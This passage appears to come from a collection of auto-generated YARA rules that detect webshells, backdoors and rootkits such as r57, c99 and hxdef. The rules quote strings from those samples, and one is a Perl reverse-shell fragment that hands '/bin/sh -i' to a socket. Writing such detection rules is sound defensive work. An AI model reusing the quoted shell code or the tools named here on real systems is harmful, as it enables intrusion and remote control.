        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file remview.php"
        category = "INFO"
        hash = "b4a09911a5b23e00b55abe546ded691c"

    strings:
        $s0 = "<xmp>$out</"
        $s1 = ".mm(\"Eval PHP code\")."
    condition:
        all of them
}
rule FeliksPack3___PHP_Shells_r57 {
    meta:
        id = "4lsXsMVOawPSBkK0eslqlQ"
        fingerprint = "v1_sha256_8d0f3b2009594d4aa413c4794dca12e3c66a19974cc6d0b47cc3f5e2572a4c57"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file r57.php"
        category = "INFO"
        hash = "903908b77a266b855262cdbce81c3f72"

    strings:
        $s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."
    condition:
        all of them
}
rule HYTop2006_rar_Folder_2006X {
    meta:
        id = "3mMZBEUui7i3vaSlChImMv"
        fingerprint = "v1_sha256_b71cf90900c7eae4caef57564292ca497a2c6c77e3de2994ba9e4cecae7f2697"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file 2006X.exe"
        category = "INFO"
        hash = "cf3ee0d869dd36e775dfcaa788db8e4b"

    strings:
        $s1 = "<input name=\"password\" type=\"password\" id=\"password\""
        $s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""
    condition:
        all of them
}
rule FSO_s_phvayv_2 {
    meta:
        id = "5930M3rrHwVlDU8t364kQL"
        fingerprint = "v1_sha256_11418a11692412ccb309983bdadd9bda2b27b692c3282eb0386094e76c7ba1e0"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file phvayv.php"
        category = "INFO"
        hash = "205ecda66c443083403efb1e5c7f7878"

    strings:
        $s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"
    condition:
        all of them
}
rule elmaliseker {
    meta:
        id = "7E4iDpaeB2ppyxVdCqjd93"
        fingerprint = "v1_sha256_54c0b8e74a9b10fe54901c0595600af1dfc54abd3f710fc20ca87ca92236bb49"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file elmaliseker.asp"
        category = "INFO"
        hash = "ccf48af0c8c09bbd038e610a49c9862e"

    strings:
        $s0 = "javascript:Command('Download'"
        $s5 = "zombie_array=array("
    condition:
        all of them
}
rule shelltools_g0t_root_resolve {
    meta:
        id = "3LCORtxu2vhfgZMWjMp9yt"
        fingerprint = "v1_sha256_39d8ac274e94f13b5eb197be5827a95ac09df70793bd584c96b81983a565c1ce"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file resolve.exe"
        category = "INFO"
        hash = "69bf9aa296238610a0e05f99b5540297"

    strings:
        $s0 = "3^n6B(Ed3"
        $s1 = "^uldn'Vt(x"
        $s2 = "\\= uPKfp"
        $s3 = "'r.axV<ad"
        $s4 = "p,modoi$=sr("
        $s5 = "DiamondC8S t"
        $s6 = "`lQ9fX<ZvJW"
    condition:
        all of them
}
rule FSO_s_RemExp {
    meta:
        id = "RT8JjuGFnJbcoxVLcgNIo"
        fingerprint = "v1_sha256_b9b966a89ab097494d7af90775bf124f1310c77145be67fa57ebdacd0164e3d0"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file RemExp.asp"
        category = "INFO"
        hash = "b69670ecdbb40012c73686cd22696eeb"

    strings:
        $s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
        $s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
        $s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"
    condition:
        all of them
}
rule FSO_s_tool {
    meta:
        id = "68X1JBH95uTIWwMtMMQgGi"
        fingerprint = "v1_sha256_a3449aca3124aa4d920d78e5e674ddd9d8a181b0ce0143032352a69dfdbcad2d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file tool.asp"
        category = "INFO"
        hash = "3a1e1e889fdd974a130a6a767b42655b"

    strings:
        $s7 = "\"\"%windir%\\\\calc.exe\"\")"
    condition:
        all of them
}
rule FeliksPack3___PHP_Shells_2005 {
    meta:
        id = "5g1K7HpMcH8PtXjW6ePsij"
        fingerprint = "v1_sha256_4d04174b23c9057acf2618c01cd702eaaec2d3508a8c25dd87fdd320c076a3b1"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file 2005.asp"
        category = "INFO"
        hash = "97f2552c2fafc0b2eb467ee29cc803c8"

    strings:
        $s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
        $s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"
    condition:
        all of them
}
rule byloader {
    meta:
        id = "3tYoblwZl3CZp5HIRgZ0r3"
        fingerprint = "v1_sha256_66c900e4bc771fb23d7623e57ad51edaa95696c2e31554720582f3e33a1b2e25"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file byloader.exe"
        category = "INFO"
        hash = "0f0d6dc26055653f5844ded906ce52df"

    strings:
        $s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
        $s1 = "Failure ... Access is Denied !"
        $s2 = "NTFS Disk Driver Checking Service"
        $s3 = "Dumping Description to Registry..."
        $s4 = "Opening Service .... Failure !"
    condition:
        all of them
}
rule shelltools_g0t_root_Fport {
    meta:
        id = "IV7ChiuhESgd5JMtBpERG"
        fingerprint = "v1_sha256_b9dc66e249c0577839cc3748f129c343d2ccb7327b92a2a67e4467782d10a25e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file Fport.exe"
        category = "INFO"
        hash = "dbb75488aa2fa22ba6950aead1ef30d5"

    strings:
        $s4 = "Copyright 2000 by Foundstone, Inc."
        $s5 = "You must have administrator privileges to run fport - exiting..."
    condition:
        all of them
}
rule BackDooR__fr_ {
    meta:
        id = "28kmRjcljqezv4pki05tbF"
        fingerprint = "v1_sha256_6c16c200712015eed71aeb119e46bad5f93445a8f719d98ef31f9012cb3551ae"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file BackDooR (fr).php"
        category = "INFO"
        hash = "a79cac2cf86e073a832aaf29a664f4be"

    strings:
        $s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "
    condition:
        all of them
}
rule FSO_s_ntdaddy {
    meta:
        id = "579G3r49ktU0CAeNuP2kRy"
        fingerprint = "v1_sha256_4df6f53ee9bfc0214e69dd858878026e962b90573ed48a5ffdd5523538e8f3bf"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file ntdaddy.asp"
        category = "INFO"
        hash = "f6262f3ad9f73b8d3e7d9ea5ec07a357"

    strings:
        $s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"
    condition:
        all of them
}
rule nstview_nstview {
    meta:
        id = "1xzfwgANfjJ5oVKoGW4v6G"
        fingerprint = "v1_sha256_2b25e22d86a672af0b8957f1b0336ed80e09f3389f5045c230af2372db0e3415"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file nstview.php"
        category = "INFO"
        hash = "3871888a0c1ac4270104918231029a56"

    strings:
        $s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"
    condition:
        all of them
}
rule HYTop_DevPack_upload {
    meta:
        id = "5K06tbkaTsCLNhXtfjhnCb"
        fingerprint = "v1_sha256_312020a72a37adb0111ac6d61810c8e476be39dc6456e80e83cd6a680e8ea051"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file upload.asp"
        category = "INFO"
        hash = "b09852bda534627949f0259828c967de"

    strings:
        $s0 = "<!-- PageUpload Below -->"
    condition:
        all of them
}
rule PasswordReminder {
    meta:
        id = "3k67PRTNYocGKHLIZYeFPa"
        fingerprint = "v1_sha256_f3da5381f5e352c541654d2af918ca8cea8049d137078670dd0538a4d13f676e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file PasswordReminder.exe"
        category = "INFO"
        hash = "ea49d754dc609e8bfa4c0f95d14ef9bf"

    strings:
        $s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."
    condition:
        all of them
}
rule Pack_InjectT {
    meta:
        id = "3fSQqeDomgjDicp73QPFYN"
        fingerprint = "v1_sha256_9f66b7b429ed585888c0fb4943bb12262247b3af8d85bc67309b27752171e66a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file InjectT.exe"
        category = "INFO"
        hash = "983b74ccd57f6195a0584cdfb27d55e8"

    strings:
        $s3 = "ail To Open Registry"
        $s4 = "32fDssignim"
        $s5 = "vide Internet S"
        $s6 = "d]Software\\M"
        $s7 = "TInject.Dll"
    condition:
        all of them
}
rule FSO_s_RemExp_2 {
    meta:
        id = "6ZOqyxMZqu9vro6dgypel5"
        fingerprint = "v1_sha256_e31e25a7c2b2e970a379a61d2dac335bd37cac48328eee9f3966ff5c77ef6f18"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file RemExp.asp"
        category = "INFO"
        hash = "b69670ecdbb40012c73686cd22696eeb"

    strings:
        $s2 = " Then Response.Write \""
        $s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"
    condition:
        all of them
}
rule FSO_s_c99 {
    meta:
        id = "5NW95Ow5fUiG3cAWgahuR4"
        fingerprint = "v1_sha256_de769299bbd8b895b84db757fcc037b807f7caaa624c06e9d330934a968b2381"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file c99.php"
        category = "INFO"
        hash = "5f9ba02eb081bba2b2434c603af454d0"

    strings:
        $s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"
    condition:
        all of them
}
rule rknt_zip_Folder_RkNT {
    meta:
        id = "6dC32VC3iG6ifxcqX73jAk"
        fingerprint = "v1_sha256_59de8a40a7081ee5fbea9f413590237c1da9985f2352b32571529baf38c93ddb"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file RkNT.dll"
        category = "INFO"
        hash = "5f97386dfde148942b7584aeb6512b85"

    strings:
        $s0 = "PathStripPathA"
        $s1 = "`cLGet!Addr%"
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
        $s3 = "oQToOemBuff* <="
        $s4 = "ionCdunAsw[Us'"
        $s6 = "CreateProcessW: %S"
        $s7 = "ImageDirectoryEntryToData"
    condition:
        all of them
}
rule dbgntboot {
    meta:
        id = "46AX1GHd7CDyXTIlrtjWwh"
        fingerprint = "v1_sha256_10f86f18aff4995928efb3c8000eca166fe37e6006de7938139cad718ff7653f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file dbgntboot.dll"
        category = "INFO"
        hash = "4d87543d4d7f73c1529c9f8066b475ab"

    strings:
        $s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
        $s3 = "sth junk the M$ Wind0wZ retur"
    condition:
        all of them
}
rule PHP_shell {
    meta:
        id = "2E7cnaOkJmbIDvVEJCAkjb"
        fingerprint = "v1_sha256_a62061b2fa851f5798158198e26f188408f3f37dca69a85ca155777c0b8407ee"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file shell.php"
        category = "INFO"
        hash = "45e8a00567f8a34ab1cccc86b4bc74b9"

    strings:
        $s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
        $s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"
    condition:
        all of them
}
rule hxdef100 {
    meta:
        id = "3jcKHDn5I40HzCH9CLySpR"
        fingerprint = "v1_sha256_a2002dcddad7ffdbe9614723163016f9357347bb704640d3933ce4513c37d474"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file hxdef100.exe"
        category = "INFO"
        hash = "55cc1769cef44910bd91b7b73dee1f6c"

    strings:
        $s0 = "RtlAnsiStringToUnicodeString"
        $s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
        $s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"
    condition:
        all of them
}
rule rdrbs100 {
    meta:
        id = "7fJs9b6dDATfahJlBZYFZR"
        fingerprint = "v1_sha256_8a427ef9e0ecd0c810913203aaef43647964f33658dfdca8195fce6f0545f8f4"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file rdrbs100.exe"
        category = "INFO"
        hash = "7c752bcd6da796d80a6830c61a632bff"

    strings:
        $s3 = "Server address must be IP in A.B.C.D format."
        $s4 = " mapped ports in the list. Currently "
    condition:
        all of them
}
rule Mithril_Mithril {
    meta:
        id = "62qXFczSl58eiatZllai27"
        fingerprint = "v1_sha256_5d19eb4132a0401d226c9cffc927b2838e9c69428746296b55a488d097759587"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file Mithril.exe"
        category = "INFO"
        hash = "017191562d72ab0ca551eb89256650bd"

    strings:
        $s0 = "OpenProcess error!"
        $s1 = "WriteProcessMemory error!"
        $s4 = "GetProcAddress error!"
        $s5 = "HHt`HHt\\"
        $s6 = "Cmaudi0"
        $s7 = "CreateRemoteThread error!"
        $s8 = "Kernel32"
        $s9 = "VirtualAllocEx error!"
    condition:
        all of them
}
rule hxdef100_2 {
    meta:
        id = "2hU77HIbn84LUbPYsxECSS"
        fingerprint = "v1_sha256_d44131f6c1bfdc36079f474832a79a361dfad96d1b84f7004d682150c93eccc5"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file hxdef100.exe"
        category = "INFO"
        hash = "1b393e2e13b9c57fb501b7cd7ad96b25"

    strings:
        $s0 = "\\\\.\\mailslot\\hxdef-rkc000"
        $s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
        $s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
    condition:
        all of them
}
rule Release_dllTest {
    meta:
        id = "2xfIlCfrcyhmBJKTcM1KrX"
        fingerprint = "v1_sha256_ba759ae1bbde357085b2b2dfda0780b5a239a44b4e999244e8eceed246090ce3"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file dllTest.dll"
        category = "INFO"
        hash = "76a59fc3242a2819307bb9d593bef2e0"

    strings:
        $s0 = ";;;Y;`;d;h;l;p;t;x;|;"
        $s1 = "0 0&00060K0R0X0f0l0q0w0"
        $s2 = ": :$:(:,:0:4:8:D:`=d="
        $s3 = "4@5P5T5\\5T7\\7d7l7t7|7"
        $s4 = "1,121>1C1K1Q1X1^1e1k1s1y1"
        $s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9"
        $s6 = "0)0O0\\0a0o0\"1E1P1q1"
        $s7 = "<.<I<d<h<l<p<t<x<|<"
        $s8 = "3&31383>3F3Q3X3`3f3w3|3"
        $s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z="
    condition:
        all of them
}
rule webadmin {
    meta:
        id = "50mJzZZQT5ygHOHxJEBjRe"
        fingerprint = "v1_sha256_6e215c3d8b8357b839416ee6951f7739387bb94aa1284ea7e827ae2205221294"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file webadmin.php"
        category = "INFO"
        hash = "3a90de401b30e5b590362ba2dde30937"

    strings:
        $s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"
    condition:
        all of them
}
rule commands {
    meta:
        id = "7Oj0nAlpsSRSUVHCVRjSxr"
        fingerprint = "v1_sha256_5251ee090934c8f99a8a2ffef2605593943306937dc56a135a47f1da7e732587"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file commands.asp"
        category = "INFO"
        hash = "174486fe844cb388e2ae3494ac2d1ec2"

    strings:
        $s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
        $s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"
    condition:
        all of them
}
rule hkdoordll {
    meta:
        id = "4Y78JbMgzqImBOY7aOtQ7V"
        fingerprint = "v1_sha256_a3c4d262b59cdf82390c0457810505e9e7a18c9b26ba4524bc368fd2141ec306"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file hkdoordll.dll"
        category = "INFO"
        hash = "b715c009d47686c0e62d0981efce2552"

    strings:
        $s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"
    condition:
        all of them
}
rule r57shell_2 {
    meta:
        id = "5QdpyMdKbMYX7lQyygOvOg"
        fingerprint = "v1_sha256_5319426928d33b62527efb561c2b7a226a5a473735f501b267e6b3b174972085"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file r57shell.php"
        category = "INFO"
        hash = "8023394542cddf8aee5dec6072ed02b5"

    strings:
        $s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"
    condition:
        all of them
}
rule Mithril_v1_45_dllTest {
    meta:
        id = "1bjgYSWIQmWQo4ESdD2JpG"
        fingerprint = "v1_sha256_cf1e2ca39ae6b726792bbbaf0f1dd90788a4bb9ba5e3d50c22d75f2b3d4e9e7d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file dllTest.dll"
        category = "INFO"
        hash = "1b9e518aaa62b15079ff6edb412b21e9"

    strings:
        $s3 = "syspath"
        $s4 = "\\Mithril"
        $s5 = "--list the services in the computer"
    condition:
        all of them
}
rule dbgiis6cli {
    meta:
        id = "7FSPJvBsi7dIoFZHyp9NLl"
        fingerprint = "v1_sha256_f6de3c9b8fbcca230540d1b41659ab02c9548df69f53fa9d5730ac7bb7dfe88a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file dbgiis6cli.exe"
        category = "INFO"
        hash = "3044dceb632b636563f66fee3aaaf8f3"

    strings:
        $s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
        $s5 = "###command:(NO more than 100 bytes!)"
    condition:
        all of them
}
rule remview_2003_04_22 {
    meta:
        id = "7GvjeMtfVpbxvoZRdHTPvg"
        fingerprint = "v1_sha256_2957f6ec7a022ac04759724276f6928625708346903597b0765b5e81207fc6b9"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file remview_2003_04_22.php"
        category = "INFO"
        hash = "17d3e4e39fbca857344a7650f7ea55e3"

    strings:
        $s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""
    condition:
        all of them
}
rule FSO_s_test {
    meta:
        id = "wVkLpvD8dID8HzeW5Gcx8"
        fingerprint = "v1_sha256_62613bead716717f116290b1c9eca9aa63eadd280050811e30a54e5d186af2fc"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file test.php"
        category = "INFO"
        hash = "82cf7b48da8286e644f575b039a99c26"

    strings:
        $s0 = "$yazi = \"test\" . \"\\r\\n\";"
        $s2 = "fwrite ($fp, \"$yazi\");"
    condition:
        all of them
}
rule Debug_cress {
    meta:
        id = "6xAMs62g2hECP2mf5UAgJW"
        fingerprint = "v1_sha256_670e236e72d3cb52ea5dba865749baee58a70f8d100db1dd8eddfe3183339181"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file cress.exe"
        category = "INFO"
        hash = "36a416186fe010574c9be68002a7286a"

    strings:
        $s0 = "\\Mithril "
        $s4 = "Mithril.exe"
    condition:
        all of them
}
rule webshell {
    meta:
        id = "1RLo40SKZLDMyNnAQ4VYCB"
        fingerprint = "v1_sha256_e3fdce426d2f6e88d8e9412a3026ea05d027af934763eafe0188602458c2289d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file webshell.php"
        category = "INFO"
        hash = "f2f8c02921f29368234bfb4d4622ad19"

    strings:
        $s0 = "RhViRYOzz"
        $s1 = "d\\O!jWW"
        $s2 = "bc!jWW"
        $s3 = "0W[&{l"
        $s4 = "[INhQ@\\"
    condition:
        all of them
}
rule FSO_s_EFSO_2 {
    meta:
        id = "5iS1n7U2sJnc4d44AG5jQo"
        fingerprint = "v1_sha256_462c713e5d4fb6d0db91b14bfacdca73f780559ba2dad80988c356ee1a3d369d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file EFSO_2.asp"
        category = "INFO"
        hash = "a341270f9ebd01320a7490c12cb2e64c"

    strings:
        $s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
        $s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
    condition:
        all of them
}
rule thelast_index3 {
    meta:
        id = "2SX9JYJX3qP8yIyZfftrtA"
        fingerprint = "v1_sha256_3700141ca2cf53f49618e2d4cab8866efccdce843921f1733b3d6260b8feea68"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file index3.php"
        category = "INFO"
        hash = "cceff6dc247aaa25512bad22120a14b4"

    strings:
        $s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"
    condition:
        all of them
}
rule adjustcr {
    meta:
        id = "7XGq6hucn3G7aKWganKnys"
        fingerprint = "v1_sha256_d2a86083ff5cb34a0453f812e2d316c63342e529f00099a8869fa7e0a43321ef"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file adjustcr.exe"
        category = "INFO"
        hash = "17037fa684ef4c90a25ec5674dac2eb6"

    strings:
        $s0 = "$Info: This file is packed with the UPX executable packer $"
        $s2 = "$License: NRV for UPX is distributed under special license $"
        $s6 = "AdjustCR Carr"
        $s7 = "ION\\System\\FloatingPo"
    condition:
        all of them
}
rule FeliksPack3___PHP_Shells_xIShell {
    meta:
        id = "3zFjNT0KiouwbyCz9trNYi"
        fingerprint = "v1_sha256_13393bc72477ab9a4ebc16b409de8ed73e086cc41f25f34315d11401b63c2471"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file xIShell.php"
        category = "INFO"
        hash = "997c8437c0621b4b753a546a53a88674"

    strings:
        $s3 = "if (!$nix) { $xid = implode(explode(\"\\\\\",$xid),\"\\\\\\\\\");}echo (\"<td><a href='Java"
    condition:
        all of them
}
rule HYTop_AppPack_2005 {
    meta:
        id = "5WjVG4lYfQKQQEfmBOrPAG"
        fingerprint = "v1_sha256_0de4800291132efca24b40bebcc895d6873110214c8cbf8384317208e0d9db82"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file 2005.asp"
        category = "INFO"
        hash = "63d9fd24fa4d22a41fc5522fc7050f9f"

    strings:
        $s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"
    condition:
        all of them
}
rule xssshell {
    meta:
        id = "1Yk20MN0hNxFSQXJoIzBl9"
